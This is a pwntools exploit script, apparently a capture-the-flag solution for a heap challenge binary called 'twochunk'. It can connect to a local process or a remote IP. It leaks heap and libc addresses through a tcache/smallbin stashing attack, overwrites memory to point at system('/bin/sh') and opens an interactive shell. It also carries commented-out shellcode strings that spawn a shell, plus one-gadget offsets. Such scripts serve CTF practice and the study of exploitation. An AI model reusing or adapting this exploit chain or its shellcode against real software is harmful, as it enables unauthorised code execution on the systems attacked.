# -*- coding: UTF-8 -*-
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./twochunk')
if local:
    p = process('./twochunk')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
#onegadget18(libc-2.27.so) 0x4f322  0x4f2c5  0x10a38c
#onegadget19(libc-2.29.so) 0xe237f  0xe2383  0xe2386  0x106ef8

# payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
# f = FormatStr(isx64=1)
# f[0x8048260]=0x45372800
# f[0x8048260+4]=0x7f20
# f.payload(7)
#shellcode = asm(shellcraft.sh())
#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))


def add(idx,size):
	ru("choice: ")
	sl('1')
	ru("idx: ")  
	sl(str(idx))
	ru("size: ")
	sl(str(size))
def free(index):
	ru("choice: ")
	sl('2')
	ru("idx: ")  
	sl(str(index))
def edit(index,content):
	ru("choice: ")
	sl('4')
	ru("idx: ")
	sl(str(index))
	ru("content: ")
	sd(content)
def show(index):
	ru("choice: ")
	sl('3')
	ru("idx: ")  
	sl(str(index))
def show_map():
	ru("choice: ")
	sl('5')
def final_malloc(content):
	ru("choice: ")
	sl('6')
	ru("leave your end message: ")
	sd(content)
def backdoor():
	ru("choice: ")
	sl('7')

name = p64(0x23333020)*6
message = 'abcdefg'

ru("leave your name:")
sd(name)
ru("leave your message: ")
sd(message)
for i in range(5):
	add(0,0x88)
	free(0)
# leak heap
add(0, 0xe9)
free(0)
add(0, 0xe9)
free(0)
add(0, 23333)
show(0)
heap = u64(rc(6).ljust(8,'\x00'))-0x530
print hex(heap)
free(0)
for i in range(7):
	add(0, 0x188)
	free(0)
add(0, 0x188)
add(1, 0x300) # padding
free(0)
add(0, 0xf8)
free(0)
add(0, 0x100) # smallbin
free(0)
free(1)
add(0, 0x188)
add(1, 0x300) # padding
free(0) # unsortedbin
free(1)
add(0, 0xf8) # overwrite
add(1, 0x100) # smallbin
free(1)
py = "\x00"*0xf0
py += p64(0)+p64(0x91)
py += p64(heap+0x1310)+p64(0x23333000-0x10)
edit(0, py)
add(1, 0x88)
show_map()
ru("message: ")
base_addr = u64(rc(6).ljust(8,'\x00'))-0x1c6c60
print "base_addr--->"+hex(base_addr)
system = base_addr + 0x30410
binsh = base_addr + 0x18ab84
print "system--->"+hex(system)
py = ''
py += p64(system) + "/bin/sh\x00"
py += p64(0)*4
py += p64(0x23333008)+p64(0)
py += p64(0)*2
final_malloc(py)
# bk(0x000000000001766+0x555555554000)
backdoor()


p.interactive()
